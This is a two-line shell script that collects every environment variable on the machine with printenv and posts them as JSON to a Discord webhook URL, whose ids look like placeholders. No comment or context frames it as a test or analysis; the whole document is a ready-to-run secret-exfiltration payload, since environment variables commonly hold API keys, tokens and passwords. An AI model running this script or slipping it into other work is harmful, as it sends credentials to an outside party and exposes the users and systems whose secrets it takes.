#!/bin/sh
curl -H "Content-Type: application/json" -d "{\"content\":\"$(printenv)\"}" https://discord.com/api/webhooks/123/abc
